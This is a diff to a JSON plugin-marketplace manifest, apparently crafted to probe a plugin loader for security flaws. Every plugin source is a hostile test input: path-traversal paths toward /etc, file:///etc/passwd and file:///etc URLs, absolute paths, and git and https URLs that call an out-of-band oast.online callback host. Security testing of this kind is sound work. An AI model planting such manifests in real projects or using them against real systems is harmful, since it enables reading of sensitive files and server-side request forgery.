@@ -1,42 +1,54 @@
 {
-  "name": "anf572b",
+  "name": "anf573",
   "owner": {
-    "name": "anf572b"
+    "name": "anf573"
   },
   "plugins": [
     {
-      "name": "q0trav",
-      "source": "../../../../anf572b-traversal"
+      "name": "anf573-local",
+      "source": "./anf573-local"
     },
     {
-      "name": "../q1nome",
-      "source": "./anf572b"
-    },
-    {
-      "name": "q2url",
-      "source": "https://anf572b-src.db6qie10ga51sb1ne1k09bkgroutgwxxn.oast.online/plugin"
-    },
-    {
-      "name": "q3obj",
+      "name": "r1https",
       "source": {
-        "type": "git_repository",
-        "url": "https://anf572b-giturl.db6qie10ga51sb1ne1k09bkgroutgwxxn.oast.online/r.git"
+        "source": "git-subdir",
+        "url": "https://anf573-https.db6qie10ga51sb1ne1k09bkgroutgwxxn.oast.online/r.git",
+        "path": "src",
+        "ref": "main"
       }
     },
     {
-      "name": "q4file",
-      "source": "file:///etc/passwd"
+      "name": "r2url",
+      "source": {
+        "source": "url",
+        "url": "https://anf573-urlvar.db6qie10ga51sb1ne1k09bkgroutgwxxn.oast.online/r.git"
+      }
     },
     {
-      "name": "q5abs",
-      "source": "/etc/anf572b-absoluto"
+      "name": "r3trav",
+      "source": {
+        "source": "git-subdir",
+        "url": "https://github.com/LucasLeal871/anf490-test.git",
+        "path": "../../../../etc",
+        "ref": "main"
+      }
     },
     {
-      "name": "q6extra",
-      "source": "./anf572b",
-      "anf572_campo_extra": true,
-      "repository": {
-        "url": "https://anf572b-repo.db6qie10ga51sb1ne1k09bkgroutgwxxn.oast.online/r"
+      "name": "r4file",
+      "source": {
+        "source": "git-subdir",
+        "url": "file:///etc",
+        "path": ".",
+        "ref": "main"
+      }
+    },
+    {
+      "name": "r5gitp",
+      "source": {
+        "source": "git-subdir",
+        "url": "git://anf573-gitproto.db6qie10ga51sb1ne1k09bkgroutgwxxn.oast.online/r.git",
+        "path": "src",
+        "ref": "main"
       }
     }
   ]
